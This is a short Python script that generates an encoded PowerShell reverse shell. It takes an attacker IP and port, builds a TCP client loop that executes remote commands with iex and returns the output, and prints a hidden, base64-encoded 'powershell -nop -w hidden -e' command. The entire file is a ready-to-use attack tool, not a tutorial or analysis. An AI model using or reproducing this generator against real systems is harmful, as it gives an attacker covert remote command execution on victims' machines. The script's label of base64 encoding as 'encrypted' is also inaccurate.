#!/usr/bin/env python3

import base64
import sys

ATTACKER_IP = "192.168.122.1"
PORT = 4444


def main():
    global ATTACKER_IP, PORT
    
    attacker_ip = ATTACKER_IP
    port = PORT

    if len(sys.argv) == 2 and sys.argv[1] in ["-h", "--help"]:
        print(f"[INFO]: Usage {sys.argv[0]} <ATTACKER_IP> <PORT>")
        sys.exit(0)

    if len(sys.argv) >= 3:
        attacker_ip, port = sys.argv[1], sys.argv[2]

    print(f"Generating payload for {attacker_ip=} AND {port=}\n")

    payload = generate_pl(attacker_ip, port)

    print(payload)
    print()
    

def generate_pl(ip, port):
    raw_payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

    base64_encrypted_payload = "powershell -nop -w hidden -e " + base64.b64encode(raw_payload.encode('utf16')[2:]).decode()

    return base64_encrypted_payload


if __name__ == "__main__":
    main()